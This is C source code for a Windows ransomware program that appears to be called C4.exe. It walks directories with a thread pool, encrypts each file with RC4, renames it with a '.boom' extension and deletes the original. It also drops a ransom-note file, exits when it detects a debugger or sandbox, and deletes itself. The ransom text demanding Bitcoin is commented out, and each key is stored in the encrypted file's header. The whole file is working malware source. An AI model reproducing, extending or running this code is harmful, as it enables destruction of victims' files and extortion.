#include <Windows.h>
#include <stdio.h>
#include <process.h>
#include "structs.h"
#include <immintrin.h>
#include "memoryutils.h"
#include "stringutils.h"
#include "antianalysis.h"
#include "arcfour.h"
#pragma warning(disable : 4996 4325 4715)
#pragma section(".text")
#define TEXT_SECTION    __declspec(allocate(".text"))
#define MAX_THREADS                 8
#define NUM_BLACKLISTED_EXTENSIONS  11
#define ENCRYPT_EXT_W               L".boom"
#define SIGNATURE                   0x4d4f4f42  // 'BOOM' 
#define KEY_SIZE                    32

/*
---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */

   ///////////////////
  // CONFIGURATION //
 ///////////////////

TEXT_SECTION BOOL g_EncryptMode         =       TRUE;     // TRUE = Encrypt, FALSE = Decrypt

TEXT_SECTION BOOL g_RansomMode          =       TRUE;     // TRUE = Drop a text file (g_Note) with payment instructions to the current directory

TEXT_SECTION BOOL g_SelfDelete          =       TRUE;     // TRUE = Binary will self-delete

TEXT_SECTION BOOL g_DebuggerEvasion     =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 

TEXT_SECTION BOOL g_Verbose             =       TRUE;     // TRUE = Print files, directories, errors, and execution time to the console



LPCWSTR g_Directories[] = { 
    L"C:\\Users\\Public", 
    NULL
}; 


LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {    
    ENCRYPT_EXT_W,
    L".exe", L".dll", L".sys", L".ini", L".conf",
    L".cfg", L".reg", L".dat", L".bat", L".cmd"
};


LPCSTR g_Note = { ""
//    "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
//    "This is not a joke. Want your data restored?\r\n"
//    "Send 0.5 BTC to the address below:\r\n"
//   "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
//    "You have 48 hours.\r\n"
};


/*
---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */

DWORD   g_StartTime,
        g_FinishTime;

typedef struct _THREAD_PARAMS {
    WCHAR path[MAX_PATH];
    BOOL encrypt;
} THREAD_PARAMS, * PTHREAD_PARAMS;


typedef struct _ENCRYPTED_FILE_HEADER {
    DWORD Signature;
    BYTE  Rc4Key[KEY_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;


PBYTE GenerateRandomKey(IN DWORD dwKeySize) {
    PBYTE			pKey = NULL;
    unsigned short	us2RightMostBytes = NULL;
    unsigned int	uiSeed = (unsigned int)__TIME__[7];
    BOOL			bResult = FALSE;

    if (!(pKey = _heapalloc(dwKeySize))) {
        return NULL;
    }

    us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);

    for (int i = 0; i < dwKeySize; i++) {

        if (!_rdrand32_step(&uiSeed))
            goto _CLEANUP;

        if (i % 2 == 0)
            pKey[i] = (unsigned int)(((us2RightMostBytes ^ uiSeed) & 0xFF) % 0xFF);
        else
            pKey[i] = (unsigned int)((((us2RightMostBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);
    }

    bResult = TRUE;

_CLEANUP:
    if (!bResult && pKey) {
        _heapfree(pKey);
        return NULL;
    }
    return pKey;
}


LPCWSTR GetFileExtensionW(LPCWSTR filePath) {   

    LPCWSTR dot = _wcsrchr(filePath, L'.');

    return (dot && *dot) ? dot : NULL;
}

BOOL IsBlacklistedExtension(LPCWSTR filePath) { 

    LPCWSTR ext = GetFileExtensionW(filePath);  

    if (!ext)
        return FALSE;

    for (int i = 0; i < NUM_BLACKLISTED_EXTENSIONS; i++) {
        if (_stricmpW(ext, g_BlacklistedExtensions[i]) == 0)
            return TRUE;
    }

    return FALSE;
}

VOID EncryptSingleFile(LPCWSTR path) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fsize = { 0 };
    DWORD size = 0, bytesRead = 0, written = 0;
    BYTE* buffer = NULL;
    PBYTE randomKey = NULL;
    RC4_CTX ctx = { 0 };
    ENCRYPTED_FILE_HEADER hdr = { 0 };
    WCHAR outPath[MAX_PATH];

    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    if (!GetFileSizeEx(hFile, &fsize) || fsize.QuadPart == 0 || fsize.QuadPart > MAXDWORD) {
        CloseHandle(hFile);
        return;
    }

    size = (DWORD)fsize.QuadPart;
    buffer = (BYTE*)_heapalloc(size);
    if (!buffer) {
        CloseHandle(hFile);
        return;
    }

    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        CloseHandle(hFile);
        _heapfree(buffer);
        return;
    }
    CloseHandle(hFile);

    randomKey = GenerateRandomKey(KEY_SIZE);
    KSA(&ctx, randomKey, KEY_SIZE);
    PRGA(&ctx, buffer, size);

    hdr.Signature = SIGNATURE;
    _memcpy(hdr.Rc4Key, randomKey, KEY_SIZE);

    _wcscpy_s(outPath, MAX_PATH, path);
    _wcscat(outPath, ENCRYPT_EXT_W);

    HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        _heapfree(buffer);
        return;
    }

    WriteFile(hOut, &hdr, sizeof(hdr), &written, NULL);
    WriteFile(hOut, buffer, size, &written, NULL);
    CloseHandle(hOut);

    DeleteFileW(path);
    _heapfree(buffer);

    if (g_Verbose)
        PRINT(L"[+] Encrypted: %s -> %s\n", path, outPath);
}

VOID DecryptSingleFile(LPCWSTR path) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hOut = INVALID_HANDLE_VALUE;
    ENCRYPTED_FILE_HEADER hdr = { 0 };
    LARGE_INTEGER totalSize = { 0 };
    DWORD read = 0, bytesRead = 0, bytesWritten = 0;
    DWORD encSize = 0;
    BYTE* buffer = NULL;
    RC4_CTX ctx = { 0 };
    WCHAR outPath[MAX_PATH];
    size_t extLen = 0, pathLen = 0;

    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINT(L"[!] Failed to open file for reading: %s\n", path);
        return;
    }

    if (!ReadFile(hFile, &hdr, sizeof(hdr), &read, NULL) || read != sizeof(hdr)) {
        if (g_Verbose)
            PRINT(L"[!] Failed to read header from file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    if (hdr.Signature != SIGNATURE) {
        if (g_Verbose)
            PRINT(L"[!] Invalid signature, skipping file: %s\n", path);
        CloseHandle(hFile);
        return;
    }

    if (!GetFileSizeEx(hFile, &totalSize)) {
        CloseHandle(hFile);
        return;
    }

    encSize = (DWORD)(totalSize.QuadPart - sizeof(hdr));
    buffer = (BYTE*)_heapalloc(encSize);
    if (!buffer) {
        if (g_Verbose)
            PRINT(L"[!] Memory allocation failed\n");
        CloseHandle(hFile);
        return;
    }

    SetFilePointer(hFile, sizeof(hdr), NULL, FILE_BEGIN);
    if (!ReadFile(hFile, buffer, encSize, &bytesRead, NULL) || bytesRead != encSize) {
        if (g_Verbose)
            PRINT(L"[!] Failed to read encrypted content\n");
        CloseHandle(hFile);
        _heapfree(buffer);
        return;
    }
    CloseHandle(hFile);

    KSA(&ctx, hdr.Rc4Key, KEY_SIZE);
    PRGA(&ctx, buffer, encSize);

    extLen = _wcslen(ENCRYPT_EXT_W);
    pathLen = _wcslen(path);
    if (pathLen <= extLen || _wcscmp(path + pathLen - extLen, ENCRYPT_EXT_W) != 0) {
        if (g_Verbose)
            PRINT(L"[!] Unexpected file extension: %s\n", path);
        _heapfree(buffer);
        return;
    }
    
    _wcsncpy_s(outPath, MAX_PATH, path, pathLen - extLen);
    outPath[pathLen - extLen] = L'\0';

    hOut = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINT(L"[!] Failed to open file for writing: %s\n", outPath);
        _heapfree(buffer);
        return;
    }

    WriteFile(hOut, buffer, encSize, &bytesWritten, NULL);
    CloseHandle(hOut);

    DeleteFileW(path);
    _heapfree(buffer);

    if (g_Verbose)
        PRINT(L"[+] Decrypted: %s -> %s\n", path, outPath);
}


// Thread pool callback that performs encryption or decryption
VOID CALLBACK FileWorkerTP(PTP_CALLBACK_INSTANCE Instance, PVOID pArgs, PTP_WORK Work) {
    THREAD_PARAMS* params = (THREAD_PARAMS*)pArgs;

    if (params->encrypt) {
        EncryptSingleFile(params->path);
    }
    else {
        DecryptSingleFile(params->path);
    }
    _heapfree(params);
}

// Directory processor that dispatches file jobs to thread pool
BOOL ProcessDirectoryMT(LPCWSTR dir, BOOL encryptMode) {
    BOOL result = FALSE;
    WCHAR dirPathW[MAX_PATH * 2], fullPathW[MAX_PATH * 2];
    WIN32_FIND_DATAW fd = { 0 };
    PTP_POOL pool = NULL;
    TP_CALLBACK_ENVIRON CallBackEnv;
    PTP_CLEANUP_GROUP cleanup = NULL;

    pool = CreateThreadpool(NULL);
    if (!pool) return FALSE;
    SetThreadpoolThreadMaximum(pool, MAX_THREADS);
    SetThreadpoolThreadMinimum(pool, 1);

    cleanup = CreateThreadpoolCleanupGroup();
    InitializeThreadpoolEnvironment(&CallBackEnv);
    SetThreadpoolCallbackPool(&CallBackEnv, pool);
    SetThreadpoolCallbackCleanupGroup(&CallBackEnv, cleanup, NULL);

    _snprintfW(dirPathW, MAX_PATH * 2, L"%s\\*", dir);
    HANDLE hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINT(L"[!] FindFirstFileW failed for %s\n", dir);
        return result;
    }

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
       // memset(fullPathW, 0, sizeof(fullPathW));
        _snprintfW(fullPathW, MAX_PATH * 2, L"%s\\%s", dir, fd.cFileName);

        BOOL isEncrypted = (_StrStrIW(fd.cFileName, ENCRYPT_EXT_W) != NULL);
        if ((encryptMode && isEncrypted) || (!encryptMode && !isEncrypted)) {
            continue;
        }

        if (encryptMode && IsBlacklistedExtension(fd.cFileName)) {
            if (g_Verbose)
                PRINT(L"[!] Skipping blacklisted: %s\n", fd.cFileName);
            continue;
        }

        THREAD_PARAMS* pParams = (THREAD_PARAMS*)_heapalloc(sizeof(THREAD_PARAMS));
        if (!pParams) {
            if (g_Verbose)
                PRINT(L"[!] HeapAlloc failed for THREAD_PARAMS\n");
            continue;
        }

        _wcscpy_s(pParams->path, MAX_PATH, fullPathW);
        pParams->encrypt = encryptMode;

        PTP_WORK work = CreateThreadpoolWork(FileWorkerTP, pParams, &CallBackEnv);
        if (!work) {
            if (g_Verbose)
                PRINT(L"[!] Failed to create threadpool work item\n");
            _heapfree(pParams);
            continue;
        }

        SubmitThreadpoolWork(work);
        result = TRUE;
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    CloseThreadpoolCleanupGroupMembers(cleanup, FALSE, NULL);
    CloseThreadpoolCleanupGroup(cleanup);
    DestroyThreadpoolEnvironment(&CallBackEnv);
    CloseThreadpool(pool);

    _snprintfW(dirPathW, MAX_PATH * 2, L"%s\\*", dir);
    hFind = FindFirstFileW(dirPathW, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return result;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            _wcscmp(fd.cFileName, L".") != 0 &&
            _wcscmp(fd.cFileName, L"..") != 0) {

            WCHAR subDir[MAX_PATH * 2];
            _snprintfW(subDir, MAX_PATH * 2, L"%s\\%s", dir, fd.cFileName);
            if (ProcessDirectoryMT(subDir, encryptMode)) {
                result = TRUE;
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return result;
}
BOOL WriteTextFile(LPCSTR note) {
    HANDLE  hFile;
    WCHAR   wCurrentDir[MAX_PATH];
    DWORD   directorySize = GetCurrentDirectoryW(MAX_PATH, wCurrentDir), bytesWritten;

    _wcscat(wCurrentDir, L"\\READ_ME_NOW.txt");

    if (directorySize == 0 || directorySize > MAX_PATH) {
        if (g_Verbose)
            PRINT("[!] Failed to get current directory.\n");
        return FALSE;
    }
    hFile = CreateFileW(wCurrentDir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (g_Verbose)
            PRINT("[!] Unable to leave note.");
        return FALSE;
    }

    WriteFile(hFile, note, (DWORD)_strlen(note), &bytesWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

// Walks multiple directories and processes files
BOOL Run(LPCWSTR* dirs, BOOL isEncrypting) {
    for (int i = 0; dirs[i] != NULL; i++) {
        if (g_Verbose)
            PRINT(L"\n[>] Target Directory: %s\n", dirs[i]);
        if (!ProcessDirectoryMT(dirs[i], isEncrypting)) {
            if (g_Verbose)
                PRINT(L"[!] Failed to process directory!\n");
        }
    }
    return TRUE;
}

int main() {

    if (g_DebuggerEvasion && IsBeingDebugged()) 
        return -1;
    
  
    if (g_Verbose)
        g_StartTime = (DWORD)GetTickCount64();

    if (DetectSandboxTiming())
        return -1;   

    if (Run(g_Directories, g_EncryptMode)) 
        PRINT(L"[>] Operation completed successfully.\n");
    else
        PRINT(L"[!] No directories processed.\n");


    if (g_Verbose) {
        g_FinishTime = (DWORD)GetTickCount64() - g_StartTime;
        PRINT(L"[>] Time: %d ms\n", g_FinishTime);
    }


    if (g_EncryptMode && g_RansomMode) {
        if (!WriteTextFile(g_Note)) {
            if (g_Verbose)
                PRINT("[!] Failed to write ransom note!\n");
        }
    }


    if (g_SelfDelete)
        if (!DeleteSelf())
            if (g_Verbose)
                PRINT("[!] Self delete failed!\n");

    return 0;
}
